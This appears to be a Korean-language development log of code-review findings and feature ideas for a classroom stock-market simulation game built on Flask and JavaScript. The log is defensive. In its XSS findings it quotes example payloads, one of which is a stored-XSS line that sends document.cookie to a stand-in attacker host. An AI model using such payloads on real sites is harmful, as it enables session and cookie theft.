- **`showBombNews()` innerHTML에 서버 헤드라인 직접 삽입** (`app.js:1157-1163`): `content.innerHTML = items.map(item => ... item.headline ...).join('')` 로 서버에서 온 뉴스 헤드라인을 sanitize 없이 innerHTML에 삽입함. 현재는 서버 생성 템플릿이라 안전하지만, 향후 진행자 커스텀 뉴스 입력 기능이 추가되면 XSS 취약점이 됨. `escHtml()` 함수가 `app.js:897-899`에 이미 정의되어 있으므로 `item.headline` → `escHtml(item.headline)` 교체 3곳으로 방어 가능하며 선제적으로 적용하는 것이 바람직함.

- **`withdraw_deposit()` RoomMember None 체크 없음** (`app.py:910-915`): `m = RoomMember.query.filter_by(room_id=rid, user_id=user.id).first()` 이후 None 여부를 확인하지 않고 `m.cash += dep.amount`를 실행함. 해당 사용자가 방 멤버가 아닌 상황(데이터 불일치, 게임 강제 종료 후 잔여 예금 등)에서 `DELETE /api/rooms/<rid>/deposits/<did>` 요청이 오면 `AttributeError` → HTTP 500 발생. `app.py:912` 직후에 `if not m: return jsonify({'error': '참여자 정보를 찾을 수 없습니다.'}), 404` 가드 한 줄 추가로 해결됨.

- **`create_deposit()` amount 상한값이 사실상 무한대** (`app.py:887-890`): `if not (0 < amount < float('inf'))` 검증의 상한이 사실상 무한대이므로 `amount = 9e300` 같은 극단적 float이 통과해 `m.cash -= amount` 로 현금이 -9e300이 될 수 있음. `m.cash < amount` 체크가 바로 뒤에 있어(`app.py:890`) 실제로는 차단되지만, float 정밀도 경계값에서 의도치 않은 동작이 가능. 검증을 `if not (1 <= amount <= m.cash)` 하나로 통합하거나 `if amount > room.starting_cash * 10: return jsonify({'error': '금액이 너무 큽니다'}), 400` 절대 상한을 추가해 명시적 상한을 두는 것이 안전.

- **`_lot_round_due()` Lock 없이 공유 `_lots` 딕셔너리 접근** (`app.py:181`): `_lot_round_due()` 내 `lot = _lots.get(rid)`, `cur = lot.get('current')`, `cur.get('state')` 가 `_lottery_lock` 없이 실행됨. `get_lottery()` (`app.py:1123`)는 `with _lottery_lock:` 블록 안에서 상태 전이를 처리하지만, `room_dict()` → `_lot_round_due()` 호출 경로는 Lock을 보유하지 않음. 다른 스레드가 Lock 안에서 `lot['current']`를 새 dict로 교체하는 동안 `cur` 변수가 stale 객체를 참조하는 TOCTOU 경합 가능. `_lot_round_due()` 내부에서 `with _lottery_lock:` 블록으로 `_lots` 조회를 보호하거나, Lock 없이 안전한 `lot.get('current', {}).get('state')` 패턴으로 교체 권장.

- **`loadStudentTxn()` 전역 `S.studentTxnUid`에 의존해 모달 연속 열기 시 경합 가능** (`app.js:503-538`): `openStudentTxn(uid)` 이 전역 `S.studentTxnUid = uid`를 설정한 뒤 `loadStudentTxn(true)` 를 호출함. 진행자가 학생 A 클릭 직후 학생 B를 연속 클릭하면 `S.studentTxnUid`가 B로 덮어써져, A의 API 응답이 나중에 도착해도 B의 거래 내역 모달에 A의 내역이 표시되는 경합 발생 가능. `loadStudentTxn()` 호출 시 `uid`를 클로저 변수로 캡처하고, API 응답 수신 시 `if (uid !== S.studentTxnUid) return;` 가드를 추가하면 경합을 방어할 수 있음.


---

## 2026-06-27

### 추가하면 좋을 기능

- **`confirmLeaveGame()` → `goHome()` 가 로그아웃 실행 — "나가기" 버튼이 세션을 완전 삭제** (`app.js:108-118`, `app.js:114`): `goHome()` 내부에서 `api.post('/api/auth/logout')`을 호출해 Flask 세션 쿠키를 삭제함. 참가자가 "나가기"를 실수로 탭하면 재입장 시 학번+이름을 처음부터 다시 입력해야 하며, 수업 중 30명이 동시에 혼란에 빠질 수 있는 고위험 UX. 최소 수정안: `confirmLeaveGame()` (app.js:114)의 `confirm()` 메시지에 "로그아웃됩니다" 문구를 추가해 의도적 행동임을 명시. 권장 수정안: `goHome()` 에서 로그아웃 API 호출을 제거하고 `S.user`·`S.room`만 초기화하거나, 확인 팝업에 "게임만 나가기(세션 유지)" / "완전 로그아웃" 두 옵션을 구분해 제공.

- **룰렛 자동닫힘 타이머가 스핀 애니메이션 도중에도 계속 카운트다운 — 결과 미표시 가능** (`app.js:975-997`, `app.js:1062-1097`): `doRouletteSpin()` 은 `await new Promise(r => setTimeout(r, 4300))`으로 4.3초 애니메이션을 대기하는데, `_startRltAutoClose()` 의 60초 카운트다운은 그 동안 멈추지 않음. 마지막 스핀을 60초 종료 4초 전에 눌렀다면 `closeRoulette()`가 애니메이션 도중 호출되어 오버레이가 사라짐. 서버에서는 스핀 결과가 정상 처리되어 현금이 변동되지만 학생은 결과를 전혀 볼 수 없음. 수정: `doRouletteSpin()` 진입 시 `_stopRltAutoClose()`로 타이머를 중단하고 결과 표시 완료 후 재시작하거나, `_rltSpinning === true` 이면 auto-close를 3~5초 연장하는 방어 로직 추가.

- **참가자 강퇴 기능이 `waiting` 상태에서만 동작 — 게임 중 잘못 입장한 학생 제거 불가** (`app.py:564-575`): `kick_member()` 의 `if room.status != 'waiting': return 400` 체크로 인해 게임 진행 중 뒤늦게 합류한 학생을 진행자가 제거할 수 없음. 최소 구현: `active/paused` 상태에서는 `RoomMember.cash = 0` 처리 후 `db.session.delete(m)` 을 수행하는 분기를 추가. 대안: `RoomMember` 모델에 `is_kicked = db.Column(db.Boolean, default=False)` 컬럼을 추가해 trade/portfolio API에서 강퇴 플래그를 확인해 거래를 차단하는 소프트-강퇴 방식.

- **예금 건수 제한 없어 소액 다중 예금 시 순위 계산 N+1 부하 가능** (`app.py:107-118`, `app.py:878-902`): `create_deposit()`에 건당 최소 금액이나 최대 건수 제한이 없어 학생이 1원짜리 예금을 수백 건 생성할 수 있음. `member_total_value()` 는 `Deposit.query.filter_by(room_id=rid, user_id=uid, status='active').all()`로 전 건을 조회하므로 30명×100건 = 3000행을 매 랭킹 조회마다 읽게 됨. `create_deposit()` 상단에 `active_count = Deposit.query.filter_by(room_id=rid, user_id=user.id, status='active').count(); if active_count >= 5: return jsonify({'error': '예금은 최대 5건까지 가능합니다.'}), 400` 한 줄 추가로 해결 권장.

---

### 제거/단순화할 것들

- **`loadLobbyMembers()` 에서 username HTML 이스케이프 누락 — XSS 취약점** (`app.js:224-231`): `lobby-members-list` 에 멤버를 렌더링할 때 `` `${m.username}` `` 을 템플릿 리터럴에 직접 삽입. `enter()` 엔드포인트(app.py:331-342)는 username 길이만 검증하고 HTML을 이스케이프하지 않으므로, 학생이 `<img src=x onerror="alert(1)">` 같은 문자열을 이름으로 입력하면 진행자·다른 참가자 화면에서 스크립트가 실행됨. `escHtml()` 함수가 `app.js:897-899` 에 이미 정의되어 있으므로 `m.username` → `escHtml(m.username)` 교체를 `loadLobbyMembers()`, `loadPLobbyMembers()` (app.js:582), `loadHostMembers()` (app.js:413-428) 등 username 을 innerHTML 에 넣는 모든 위치에 적용 필요.

- **`dep-amount` 입력에 `step` 속성 없어 소수점 원 입력 가능** (`index.html:424`, `app.py:887-888`): `<input id="dep-amount" type="number">` 에 `step` 속성이 없어 학생이 `1234567.89` 같은 값을 입력할 수 있음. 서버 `create_deposit()` 에서 `amount = float(...)` 후 별도 반올림 없이 `Deposit(amount=amount)` 로 저장됨. `index.html:424` 에 `step="10000" min="10000"` 을 추가하고, `app.py:888` 에서 `amount = int(amount // 10000) * 10000` 으로 만 원 단위를 서버에서도 강제하면 프론트·백 양쪽에서 일관성 확보.

- **`_lot_round_due()` 동일 요청에서 이중 호출** (`app.py:300`, `app.py:409-430`, `app.py:470-473`): `GET /api/rooms/<rid>` 처리 시 `_auto_start_lottery_if_due(room)` (line 470) 과 `_get_room_cached()` → `room_dict()` → `_lot_round_due()` (line 300) 가 순서대로 각각 호출됨. `_lot_round_due()` 는 `_lots[rid]` 초기화·상태 조회·percentage 계산을 포함하므로 불필요한 중복 실행. `_auto_start_lottery_if_due()` 에서 계산 결과를 반환하고 `room_dict()` 가 이를 재사용하도록 리팩터링하거나, `_lot_round_due()` 를 경량화해 중복 호출 비용을 최소화할 것.

- **`closeLotteryOverlay()` 가 paused-banner 를 실제 게임 상태와 무관하게 무조건 삭제** (`app.js:2277-2281`): 마지막 줄 `document.getElementById('paused-banner')?.remove()` 가 게임이 여전히 `paused` 상태인 경우에도 배너를 제거함. 복권 결과를 확인하고 닫은 뒤 진행자가 별도로 일시정지한 게임에서 참가자가 "거래 가능" 상태로 착각할 수 있음. `if (S.room?.status !== 'paused') document.getElementById('paused-banner')?.remove();` 로 조건부 삭제하거나, 오버레이 닫기 후 룸 상태를 재확인해 배너 표시 여부를 결정하도록 개선 필요.

---

## 2026-06-27 (2차)

### 추가하면 좋을 기능

- **진행자 게임 중 공지사항 브로드캐스트** (`app.py:new endpoint POST /api/rooms/<rid>/host/announce`, `app.js:new overlay`): 진행자가 "30분 후 세금 이벤트 예정!", "금 섹터 집중 주목!" 같은 자유 텍스트 공지를 게임 중 실시간으로 전송하면 모든 참가자 화면에 10초짜리 전체화면 팝업 배너로 표시하는 기능. 현재 폭탄뉴스(`showBombNews()`, `app.js:1148`)는 자동 생성 헤드라인만 표시하지만, 공지사항은 진행자가 직접 입력한 메시지를 전달. 서버 측에는 `_announcements = {rid: {text: str, ts: float}}` 인메모리 딕셔너리를 추가하고 `GET /api/rooms/<rid>/news` 응답에 `announcement` 필드를 포함시키는 방식으로 8초 폴링 인프라를 재활용하면 신규 엔드포인트 1개 + JS 20줄 미만으로 구현 가능.

- **진행자 사전 이벤트 스케줄러** (`app.py:new endpoint POST /api/rooms/<rid>/host/schedule-event`, `models.py:Room`): 진행자가 게임 시작 전 "게임 40% 경과 시 반도체 섹터 -15%", "종료 10분 전 전체 시장 +8%" 등 이벤트를 미리 등록해 두면 `room_dict()` 내 `_lot_round_due()` 패턴과 동일하게 타이밍 도달 시 자동으로 `force_sector_event()`를 트리거하는 기능. 이벤트 목록을 `Room` 모델에 `scheduled_events TEXT` (JSON 직렬화) 컬럼으로 영속화하고 `get_room()` (`app.py:432`) 의 자동 종료 체크 블록 직후 스케줄 체크 루프를 추가하면 됨. 수업 시나리오를 미리 준비한 교사가 게임 중 화면에서 눈을 뗄 필요 없이 준비된 이벤트가 자동 실행되어 수업 몰입도를 높임.

- **학생 현금 안전금고(자기 보호 하한)** (`app.js:execTrade()`, `app.js:doRouletteSpin()`): 학생이 "잔액의 최소 20%는 절대 쓰지 않겠다"는 하한을 설정하면 `execTrade()` 와 `doRouletteSpin()` 이 해당 금액 이하로의 거래를 클라이언트 측에서 차단하고 경고를 표시하는 기능. `localStorage.setItem('safetyFloor-' + S.room.id, amount)` 로 저장하고 포트폴리오 탭에 설정 UI를 추가하면 서버 변경 없이 순수 JS로 구현 가능. 충동적 투자 억제·손실 관리 교육과 연계 가능하며, "내 안전금고는 얼마였나요?" 수업 후 토론 소재로 활용될 수 있음.

- **방 설정 자동 저장 (localStorage 자동 채움)** (`app.js:doCreateRoom()`, `index.html:51-65`): 진행자가 방을 만들 때 설정한 게임 시간·시작 자금·예금 금리를 `doCreateRoom()` 성공 시 `localStorage.setItem('lastRoomCfg', JSON.stringify({dur, cash, rate}))` 로 저장하고, 다음 방 만들기 화면(`screen-host-create`) 진입 시 `lastRoomCfg` 를 읽어 폼 필드를 자동 채우는 기능. 매 수업마다 동일한 값을 재입력하는 불편을 없애며 서버 변경 없이 10줄 미만으로 구현 가능. `doCreateRoom()` 반환 시와 방 만들기 화면 진입 이벤트(`enterHostLobby()` 진입 전 showScreen 호출부)에 각각 1~2줄 추가하면 완성됨.

- **학생 개인 거래내역 CSV 다운로드** (`app.py:new endpoint GET /api/rooms/<rid>/transactions/export`): 현재 엑셀 내보내기(`app.py:1419`)는 호스트 전용이며 최종 순위만 포함됨. 참가자 본인의 전체 거래 내역(매수/매도/보상/룰렛)을 CSV 형식으로 다운로드하는 엔드포인트를 추가하면, 학생이 게임 종료 후 자신의 거래 전략을 직접 분석하는 수업 활동이 가능해짐. `RoomTransaction.query.filter_by(room_id=rid, user_id=user.id)` 결과를 파이썬 표준 라이브러리 `csv.DictWriter` 로 스트리밍하면 `openpyxl` 없이 경량 구현 가능 (`app.py:1417` 참조). 헤더는 `날짜, 종목, 유형, 수량, 가격, 금액, 메모` 로 한글화.

- **진행자 시장 탭에서 종목 차트 바로 조회** (`app.js:314-358`, `app.js:1327-1357`): 진행자 시장 탭(`loadHostMarket()`) 의 종목 카드는 현재 가격·변동률만 표시하고 클릭해도 아무 반응이 없음. 강제 시세 변경 전 추세를 파악하려면 진행자가 별도로 학생 화면을 열어야 함. `renderGrid()` 와 달리 `loadHostMarket()` 의 카드 생성 템플릿(`app.js:343-358`)에 `onclick="openStockModal('${st.symbol}')"` 을 추가하면 기존 `openStockModal()` 함수(`app.js:1327`)를 재사용해 차트 모달을 바로 열 수 있음. 단, 진행자 화면에서는 매수/매도 버튼을 숨기거나 비활성화(`S.room.is_host` 체크)해야 하며, 이미 `host_members_transactions` 모달에 같은 패턴이 있어 5줄 이내 수정으로 구현 가능.

---

### 제거/단순화할 것들

- **`trade()` 잔액 검사-커밋 간 TOCTOU — 동시 매수 시 음수 현금 가능** (`app.py:748-765`): `if member.cash < amount: return ...` 체크와 `db.session.commit()` 사이에 DB 수준 잠금이 없어, 동일 학생이 두 탭에서 거의 동시에 매수 요청을 보내면 두 요청 모두 "잔액 충분" 판정을 통과한 뒤 각각 커밋돼 현금이 음수가 될 수 있음. 예: 잔액 600만 원에서 400만 원짜리 주식 두 건 동시 매수 → 최종 현금 -200만 원. 근본 해결책: `member.cash = RoomMember.cash - amount` 대신 SQLAlchemy `UPDATE room_members SET cash = cash - :amount WHERE id = :id AND cash >= :amount` 원자적 감소 + `rowcount == 0` 시 잔액 부족 에러 반환. 단기 해결책: 트랜잭션 내 `db.session.refresh(member)` + 재검증 후 커밋 패턴으로 스테일 읽기 방지 (`app.py:748` 직전).

- **`host_market_event()` 뉴스 캐시 미무효화** (`app.py:1357-1360`): `force_sector_event()` 내부에서 `self._news` 와 `self._last_news_ts` 를 갱신하지만, `_news_cache` (`app.py:67`) 딕셔너리는 무효화되지 않아 섹터 이벤트 직후 최대 2초 동안 참가자가 이전 뉴스를 받음. `host_force_price()` 의 동일 문제는 2026-06-23 (2차) 항목에 기록됐으나 `host_market_event()` 는 포함되지 않았음. `return jsonify(...)` 직전(`app.py:1360`)에 `_invalidate_news_cache(rid)` 한 줄 추가로 해결되며, 섹터 이벤트와 연계 뉴스가 즉시 클라이언트에 반영됨.

- **`loadStudentTxn()` `t.note` HTML 미이스케이프 — 진행자 입력 Stored XSS** (`app.js:530-531`, `app.py:596`): `host_adjust()` 의 `note = d.get('note', '진행자 자산 조정')` 는 사용자 입력을 그대로 DB(`RoomTransaction.note`)에 저장하고, `host_member_transactions()` 와 `get_transactions()` 가 이를 반환하면 `loadStudentTxn()` 의 `` `${t.note ? ' · ' + t.note : ''}` `` 이 `innerHTML` 에 이스케이프 없이 삽입됨. 진행자가 조정 메모 입력란(`adj-note`)에 `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` 를 입력하면 거래 내역 모달을 여는 진행자 본인 화면에서 Stored XSS 발생. `app.js:531` 에서 `escHtml(t.note)` 적용 필수 (`escHtml()` 함수는 `app.js:897-899` 에 이미 존재); 서버 측에서도 `app.py:596` 에서 `note = note[:100]` 길이 제한 추가 권장.

- **`get_quiz()` 조회 시 `seen` 에 즉시 추가 — 제출 없이도 문제 소모** (`app.py:1265-1268`): `GET /api/rooms/<rid>/quiz` 응답 시점에 `seen.add(q['id'])` 가 실행됨(`app.py:1266`). 학생이 퀴즈 오버레이를 열었다가 답하지 않고 닫으면 해당 문제는 "조회됨"으로 처리돼 재출제되지 않음. 15개 문제가 있다면 학생이 15번 연속 열고 닫으면 모든 문제를 소모해 이후 출제될 문제가 없어짐. 수정 방법: `seen.add(q['id'])` 를 `submit_quiz()` (`app.py:1341`) 내 정답/오답 처리 블록으로 이동하거나, `GET` 응답에 `pending_qid` 만 저장하고 `POST` 제출 시 확정하는 두 단계 처리로 변경 (`app.py:1267`).

- **`force_sector_event()` 후 `_current_biases` 미갱신 — 섹터 이벤트가 다음 TTL에 역전** (`stock_service.py:244-276`): `force_price()` 의 동일 문제는 2026-06-11 항목에 문서화됐으나 `force_sector_event()` 는 포함되지 않음. 이 함수는 섹터 내 모든 종목 가격을 강제 이동시키지만 `self._current_biases` 를 갱신하지 않아, 다음 `_price_ttl` 사이클(기본 20초)에서 기존 bias 방향으로 가격이 역전될 수 있음. `for sym in affected:` 루프 내 (`stock_service.py:252` 직후)에 `self._current_biases[sym] = 'up' if pct > 0 else 'down'` 한 줄 추가로 섹터 이벤트 모멘텀이 다음 사이클에도 유지됨.

- **`_next_price()` 자연 변동 상한 `base * 1.4` vs. `force_price()` 상한 `base * 3.0` 불일치** (`stock_service.py:139`, `stock_service.py:225`): 자연 가격 변동은 `max(base * 0.6, min(base * 1.4, new_price))` 로 제한되지만, 진행자 강제 조정은 `max(base * 0.3, min(base * 3.0, new_price))` 까지 허용함. 강제로 `base * 2.0` 으로 올린 뒤 다음 TTL에 자연 변동이 발생하면 `_next_price()` 가 `current`(=`base*2.0`)를 기준으로 새 가격을 계산하는 게 아니라 내부적으로 여전히 `base * 1.4` 캡을 적용하므로 강제 조정 효과가 1 TTL(20초) 만에 사라짐. 해결책: `_next_price()` 캡을 현재가 기준 상대 범위(`current * [0.7, 1.3]`)로 변경하거나, `force_price()` 직후 `_price_ttl` 동안 해당 종목의 자연 변동을 스킵하는 `_force_protected: set` 플래그를 추가해야 함 (`stock_service.py:174` 의 `get_price()` 캐시 체크 로직 참조).

---

## 2026-06-28

### 추가하면 좋을 기능

- **게임 진행 중 진행자 강퇴 기능 허용** (`app.py:566-575`): `kick_member()`에서 `room.status != 'waiting'` 조건(app.py:570)으로 게임 시작 후에는 강퇴가 불가. 수업 중 부정행위 학생이나 연결 문제 학생을 즉시 제거하려 해도 방법이 없음. `_end_room()` (app.py:144-153) 내 보유 주식 현금 청산 로직을 `_liquidate_member(rid, uid, svc)` 함수로 분리하고, `kick_member()`에서 게임 진행 중일 때도 해당 함수를 호출한 뒤 `RoomMember` 삭제를 허용하면 구현 가능. 서버 30줄, 클라이언트 0줄 수정.

- **큰 금액 거래 시 확인 다이얼로그** (`app.js:execTrade()` 부근, `index.html:713-716`): 고등학생이 "전량 매수" 버튼이나 수량 입력 실수로 총자산의 50% 이상을 한 번에 거래하는 사고가 잦음. 매수·매도 버튼 핸들러에서 `amount > S.room.starting_cash * 0.5` 조건일 때 `confirm('총자산의 XX%를 한 번에 거래합니다. 계속할까요?')`를 표시하면 실수를 줄일 수 있음. 서버 변경 불필요, JS 5줄 추가.

- **뉴스 클라이언트 폴링 주기를 서버 설정에 동기화** (`app.js:807-819`, `app.py:631-646`): `startNewsPolling()`이 8초 고정 간격으로 `/news`를 요청하지만, 진행자가 `news_seconds`를 60초로 늘려도 클라이언트는 8초마다 동일 캐시를 수신. Render 무료 플랜에서 불필요한 요청 부담. `doSetIntervals()` (app.js:391) 응답 수신 후 `clearInterval(S.newsInterval); S.newsInterval = setInterval(..., Math.max(8000, data.news_seconds * 1000))` 패턴으로 간격을 갱신하면 트래픽 대폭 절감.

- **포트폴리오 도넛 차트에 섹터 집계 토글** (`app.js:portChart` 초기화, `index.html:388-391`): 현재 도넛 차트는 종목별 비중만 표시. 토글 버튼 하나로 종목별 ↔ 섹터별 보기를 전환하면 `STOCKS[sym]['sector']`를 이용해 "반도체 45% / IT 30% / 금융 25%"처럼 렌더링 가능. 분산투자·집중투자 개념을 시각적으로 토론할 수 있는 교육 포인트 제공. 서버 변경 불필요.

- **결과 화면 및 Excel에 학생별 거래 요약(최다 거래 종목·섹터) 추가** (`app.py:1419-1488`, `app.js:loadResults()`): 현재 Excel `최종 순위` 시트는 순위·이름·학번·자산·수익률만 포함. `RoomTransaction` 조회로 종목별 거래 횟수를 집계하고, Excel에 "거래 요약" 시트를 추가(`wb.create_sheet('거래 요약')`)하면 교사의 사후 수업 평가 자료가 풍부해짐. `export_rankings()` (app.py:1419)에 `openpyxl` 시트 추가 20줄로 구현 가능.

---

### 제거/단순화할 것들

- **`force_price()` 클램프 범위(±200%)와 `_next_price()` 클램프 범위(±40%) 불일치** (`stock_service.py:139`, `stock_service.py:225`): `force_price()`는 `base * 0.3` ~ `base * 3.0`까지 허용하지만, 자연 가격 갱신 `_next_price()`는 `base * 0.6` ~ `base * 1.4`로 제한. 진행자가 종목을 3배로 강제 조정한 뒤 다음 자연 갱신 틱에서 `current * (1 + drift)`가 여전히 ~3x이지만 클램프에 막혀 즉시 -53% 하락하는 시각적 충격이 학생들에게 혼란을 줌. `_next_price()` (stock_service.py:139)의 클램프를 `max(base * 0.3, min(base * 3.0, new_price))`로 통일하거나, 현재가 기반 ±30% 클램프로 교체 권장.

- **`refreshMyRank()`가 전체 랭킹 API를 10초마다 호출** (`app.js:735-752`, `app.py:808-824`): `refreshMyRank()`는 자신의 순위 한 줄만 필요하지만 `/rankings` 엔드포인트에서 30명 전체 데이터를 수신. 30명 학급에서는 10초마다 31개 요청이 모두 전체 목록을 가져옴. `get_portfolio()` (app.py:772-803) 응답에 `rank: int` 필드 하나를 추가하면 `refreshMyRank()`를 포트폴리오 API로 대체 가능하며, 랭킹 페이지 진입 시에만 전체 목록을 조회하는 패턴으로 전환할 수 있음.

- **`_end_room()` 내 인메모리 상태 정리가 6개 딕셔너리에 분산** (`app.py:155-163`): `_lots`, `_rlt_active`, `_quiz_settings`, `_roulette_config`, `_quiz_state`, `_ending_soon` 를 개별적으로 pop/discard로 정리. 향후 인메모리 상태가 추가될 때 이 블록을 빠뜨리면 방 종료 후 메모리 누수 발생. `_ROOM_DICTS = [_lots, _rlt_active, _quiz_settings, _roulette_config]` 리스트를 모듈 상단에 선언하고 `for d in _ROOM_DICTS: d.pop(room.id, None)` 한 줄로 교체하면 유지보수성이 높아짐.

- **로비 멤버 목록 폴링이 진행자·참가자 각각 5초마다 개별 실행** (`app.js:192`, `app.js:562`): 진행자 로비 `setInterval(loadLobbyMembers, 5000)`와 참가자 로비 `setInterval(... loadPLobbyMembers ..., 5000)` 이 모두 `lobby-members` 엔드포인트(app.py:577-585)를 5초마다 호출. 30명 학급에서 초당 약 6회 요청이 로비 단계에만 집중됨. 서버 측 `lobby_members()`에 간단한 1-2초 캐시를 추가하거나, 폴링 주기를 10-15초로 늘리는 것만으로도 Render 무료 플랜의 응답 속도 개선 가능.

- **`loadPLobbyMembers()` 오류 발생 시 빈 화면으로 조용히 실패** (`app.js:578-586`): `await api.get(...).catch(() => [])` 패턴으로 API 실패를 빈 배열로 대체해 학생이 연결 오류를 인지하지 못함. 모바일 wifi 전환이나 Render 콜드 스타트 시 대기 화면이 그냥 멈춘 것처럼 보임. `.catch(err => { toast('연결 상태를 확인해 주세요', 'error'); return []; })` 로 바꾸면 학생이 능동적으로 새로고침 가능.

---

## 2026-06-28 (2차)

### 추가하면 좋을 기능

- **게임 시간 연장 버튼** (`app.py:503-517`, `app.js:doPauseGame` 근처): 현재 pause/resume은 있지만 진행자가 게임 종료 시각을 직접 늘릴 방법이 없음. 수업이 예상보다 일찍 끝날 것 같을 때 또는 학생 참여가 부족할 때 즉석 대응 불가. `POST /api/rooms/<rid>/extend` 엔드포인트를 추가해 `delta_minutes` 파라미터(1~30)를 받아 `room.end_time += timedelta(minutes=delta_minutes)` 처리하는 10줄짜리 엔드포인트로 구현 가능. 진행자 설정 탭에 [+5분] [+10분] 버튼 2개로 충분.

- **학생별 거래 쿨다운(최소 간격) 설정** (`app.py:724-767`): 현재 거래 횟수 제한이 없어 학생이 초 단위로 수십 번 buy/sell 반복 가능. 패닉 셀링·알고리즘 트레이딩 흉내를 방지하고 "실제 거래에는 결제 T+2일이 걸린다"는 개념을 체험시키려면 최소 간격이 필요. `_trade_cooldown: dict = {}` (room_id, user_id → 마지막 거래 시각)를 `app.py` 모듈에 추가하고, `trade()`(app.py:724) 첫 줄에 `if time.time() - _trade_cooldown.get((rid, user.id), 0) < TRADE_COOLDOWN_SECS: return 400` 한 줄로 방어 가능. 진행자 설정 탭에서 0~60초 슬라이더로 조절.

- **일시정지 중 진행자 공지 메시지** (`app.py:490-501`, `app.js:showPausedBanner`): 게임을 일시정지할 때 진행자가 메시지(예: "5분 뒤 재개합니다", "다음 섹터를 보세요")를 입력하면 참가자 ⏸ 배너 아래에 표시되는 기능. 서버에 `_pause_messages: dict = {}` (room_id → str)를 추가하고, `pause_room()`(app.py:490)에서 `_pause_messages[rid] = d.get('message', '')`, `room_dict()`(app.py:278)에서 `'pause_message': _pause_messages.get(room.id, '')`를 포함하면 됨. 클라이언트 `showPausedBanner()`(app.js:653)에서 `S.room.pause_message`를 배너 텍스트에 추가하는 2줄 수정.

- **배당금 지급 이벤트** (`app.py:host_market_event` 아래, `app.py:1345-1360`): 진행자 설정 탭에 "배당금" 버튼을 추가해 특정 종목 보유자에게 보유 수량×주당 배당금을 현금으로 지급. 장기투자의 배당 수익 개념을 체험시킬 수 있음. `POST /api/rooms/<rid>/host/dividend` 엔드포인트에서 `symbol`·`amount_per_share`를 받아 `RoomHolding.query.filter_by(room_id=rid, symbol=symbol).all()`로 보유자를 찾고 `m.cash += h.shares * amount_per_share` + `RoomTransaction(action='ADJ', note='배당금')` 처리. 서버 약 20줄, 클라이언트 UI 약 15줄.

- **대기실에서 방 설정 수정 기능** (`app.py:363-390`, `app.js:doCreateRoom`): 방 생성 후 게임 시작 전(`waiting` 상태)에도 시작 자금·게임 시간·예금 금리를 변경할 수 없음. 학생 수 확인 후 실수한 값을 고치려면 방을 지우고 다시 만들어야 함. `PATCH /api/rooms/<rid>` 엔드포인트를 추가해 `room.status == 'waiting'`일 때만 `duration_minutes`, `starting_cash`, `deposit_rate` 수정을 허용하고, 진행자 로비 화면에 연필 아이콘 버튼을 제공하면 됨.

- **보유 종목의 게임 시작 대비 수익률 표시** (`app.py:780-803`, `app.js:loadPortfolio`): 포트폴리오 화면에서 현재 수익은 `avg_price` 대비 `current_price`(매수 단가 기준)만 보여줌. 학생이 게임 시작 시점 기준으로 해당 종목이 얼마나 올랐는지 비교하면 "싸게 샀는가"가 아닌 "시장 흐름을 읽었는가"를 평가하는 교육 포인트가 생김. `StockService._init_prices()`(stock_service.py:121-127)에서 초기 가격을 `_initial_prices: dict`로 별도 저장하고, `/api/rooms/<rid>/stocks` 응답에 `initial_price` 필드를 추가하면 프론트엔드에서 "게임 시작 이후 +X%" 컬럼 추가 가능.

---

### 제거/단순화할 것들

- **`RoomHolding` 0주 고스트 행 DB 방치** (`app.py:1318`, `app.py:1037`): 퀴즈 오답 패널티(app.py:1318)와 룰렛 베팅 자금 조달(app.py:1037) 시 보유 주식을 전량 청산할 때 `h.shares = 0; h.avg_price = 0`만 하고 `db.session.delete(h)`를 호출하지 않음. 정상 SELL 경로(app.py:762)에서는 `db.session.delete(holding)`을 올바르게 호출하는 것과 불일치. 결과적으로 0주짜리 `RoomHolding` 행이 DB에 누적되어 `get_portfolio()`(app.py:781)에서 `if h.shares <= 0: continue`로 필터링해야 하는 부담이 생김. 두 곳 모두 `h.shares = 0` 직후 `if h.shares <= 0: db.session.delete(h)` 한 줄 추가로 해결 가능.

- **`Room.query.get_or_404()` 전체 코드베이스 20+ 곳에서 deprecated 패턴 사용** (`app.py:435`, `app.py:478`, `app.py:490`, `app.py:503`, `app.py:519`, `app.py:544`, `app.py:567`, `app.py:587` 등): SQLAlchemy 2.0에서 `Query.get()` 계열은 deprecated. 이미 `cur_user()`(app.py:104)와 `lobby_members()`(app.py:580)에서는 `db.session.get()` 패턴을 올바르게 사용 중. 일괄적으로 `Room.query.get_or_404(rid)` → `db.get_or_404(Room, rid)` 로 sed 치환 한 번으로 해결 가능하며, 경고 로그가 없어져 Render 콘솔 노이즈도 감소.

- **`minigame_close()`에서 `Room.query.get(rid)` 사용** (`app.py:977`): `room = Room.query.get(rid)` — 같은 파일에서 이미 deprecated로 전환 중인 패턴. `db.session.get(Room, rid)`로 한 줄 교체 필요. 결과가 None일 때 처리도 `if room and room.status == 'paused':` 로 이미 있어 로직 변경 불필요.

- **`withdraw_deposit()`에서 `RoomMember` None 체크 없음** (`app.py:912-914`): `m = RoomMember.query.filter_by(room_id=rid, user_id=user.id).first()` 이후 바로 `m.cash += dep.amount` 를 호출하는데, `if not m:` 가드가 없음. 참여자가 강퇴됐거나 데이터 불일치 발생 시 `AttributeError: 'NoneType' object has no attribute 'cash'`로 500 에러. `if not m: return jsonify({'error': '참여자를 찾을 수 없습니다.'}), 404` 한 줄 삽입으로 방어 가능. `host_adjust()`(app.py:597), `trade()`(app.py:734)에서는 동일 패턴에 이미 체크가 있어 일관성도 맞지 않음.

- **`assetLineChart` 포트폴리오 탭 전환마다 destroy/recreate** (`app.js:1509-1540`): `loadPortfolio()` 호출 시마다 `if (S.assetLineChart) S.assetLineChart.destroy(); S.assetLineChart = new Chart(...)` 패턴으로 차트를 완전히 재생성. `S.assetHistory` 배열은 공유 참조이므로 `S.assetLineChart.data.labels = ...; S.assetLineChart.data.datasets[0].data = ...; S.assetLineChart.update()` 패턴으로 교체하면 탭 전환 시 캔버스 깜빡임과 불필요한 Chart.js 메모리 할당을 제거 가능. 호스트 바 차트(`renderHostBarChart()`, app.js:433-477)는 이미 이 패턴을 올바르게 사용 중이므로 일관성도 맞지 않음.

